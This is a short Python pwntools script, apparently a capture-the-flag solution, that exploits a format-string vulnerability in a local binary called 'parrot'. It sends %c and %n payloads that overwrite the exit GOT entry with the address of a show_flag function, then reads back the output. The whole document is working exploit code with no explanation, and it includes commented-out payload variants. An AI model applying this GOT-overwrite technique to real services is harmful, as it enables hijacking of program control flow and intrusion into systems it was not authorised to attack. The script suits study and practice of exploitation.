#!/home/enigma/.pyenv/versions/3.6.0/bin/python
# coding: utf-8

from pwn import *

sock = remote("localhost", 4000)

parrot = ELF("./parrot")
got_exit = parrot.got['exit']
# show_flag = 0x80486160
show_flag = 0x400707

print("[+] exit.got = " + hex(got_exit))

# payload = "%[0]c%17$n".format(got_exit)
payload = "%{0}c%17$n".format(got_exit)
sock.sendline(payload)
print("[+] wrote exit.got to argv")

# payload = "%[0]c%53$n".format(show_flag)
payload = "%{0}c%53$n".format(show_flag)
sock.sendline(payload)

print("[+] wrote &show_flag to exit.got")

sock.sendline("HOGEHOGE")

data = sock.recvall()
print(data[-100:])